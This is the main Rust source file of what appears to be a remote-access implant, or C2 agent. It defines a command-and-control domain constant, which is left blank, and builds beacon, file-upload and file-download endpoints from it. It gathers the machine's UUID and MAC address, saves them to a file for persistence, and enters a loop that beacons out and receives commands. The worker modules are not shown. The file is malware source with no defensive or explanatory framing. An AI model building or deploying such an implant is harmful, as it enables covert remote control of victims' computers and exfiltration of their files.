mod beacon;
mod commands;
mod sysinfo;
mod utils;

const C2_DOMAIN: &str = "";
fn get_upload_url() -> String {
    format!("https://{}:443/api/v1/files", C2_DOMAIN)
}

fn get_download_url() -> String {
    format!("https://{}:443/api/v1/send_file", C2_DOMAIN)
}

fn get_beacon_url() -> String {
    format!("https://{}:443/api/v1/beacon", C2_DOMAIN)
}

#[tokio::main]
async fn main() {
    // Retrieve system information and UUID, which is saved in a file for persistence
    let (uuid, mac_addr) = sysinfo::saver::save_file().expect("Error saving file");

    // Run the main loop to send beacons and receive commands
    beacon::beacon::run(
        uuid,
        mac_addr,
        &get_beacon_url(),
        &get_upload_url(),
        &get_download_url(),
    )
    .await;
}
